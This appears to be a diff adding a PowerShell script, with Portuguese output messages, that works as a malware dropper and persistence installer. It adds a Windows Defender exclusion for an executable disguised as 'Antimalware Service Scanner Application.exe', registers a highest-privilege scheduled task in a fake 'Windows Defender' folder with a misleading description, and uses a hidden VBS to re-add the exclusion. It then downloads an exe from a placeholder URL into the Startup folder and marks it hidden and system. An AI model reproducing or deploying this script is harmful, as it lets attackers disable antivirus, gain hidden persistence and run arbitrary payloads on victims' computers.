@@ -1,0 +1,48 @@
+$filePath = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Antimalware Service Scanner Application.exe"
+
+Add-MpPreference -ExclusionPath $filePath
+
+$taskName = "AntiMalwareMicrosoftServiceScheduler"
+
+$exePath = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Antimalware Service Scanner Application.exe"
+
+$triggerEveryMinute = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)
+
+$triggerAtStartup = New-ScheduledTaskTrigger -AtStartup
+
+$actionRunExe = New-ScheduledTaskAction -Execute $exePath
+
+$hiddenScript = "Set objShell = CreateObject(""WScript.Shell"")" + "`n" +
+                "objShell.Run ""powershell.exe -Command Add-MpPreference -ExclusionPath '$filePath'"", 0, False"
+
+$tempVbsPath = "$env:TEMP\hiddenAddExclusion.vbs"
+Set-Content -Path $tempVbsPath -Value $hiddenScript
+
+$actionAddExclusion = New-ScheduledTaskAction -Execute "wscript.exe" -Argument $tempVbsPath
+
+$currentUsername = (Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName)
+$principal = New-ScheduledTaskPrincipal -UserId $currentUsername -LogonType Interactive -RunLevel Highest
+
+$taskFolder = "\Microsoft\Windows\WS\Windows Defender"
+
+$scheduleService = New-Object -ComObject "Schedule.Service"
+$scheduleService.Connect()
+$rootFolder = $scheduleService.GetFolder("\Microsoft\Windows\WS")
+try {
+    $rootFolder.GetFolder("\Windows Defender") | Out-Null
+} catch {
+    $rootFolder.CreateFolder("Windows Defender")
+    Write-Host "A pasta '$taskFolder' foi criada no Agendador de Tarefas."
+}
+
+Register-ScheduledTask -TaskPath $taskFolder -Action $actionRunExe, $actionAddExclusion -Trigger $triggerEveryMinute, $triggerAtStartup -Principal $principal -TaskName $taskName -Description "Windows Defender: Update MRT"
+Write-Host "A tarefa '$taskName' foi criada na pasta '$taskFolder' com múltiplas ações."
+
+Start-Sleep -Seconds 5
+$url = "LINK DO DOWNLOAD DO EXE AQUI!"
+$nomeArquivo = "Antimalware Service Scanner Application.exe"
+$destino = Join-Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" $nomeArquivo
+Invoke-WebRequest -Uri $url -OutFile $destino | Out-Null
+
+$attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
+[System.IO.File]::SetAttributes($filePath, $attributes)
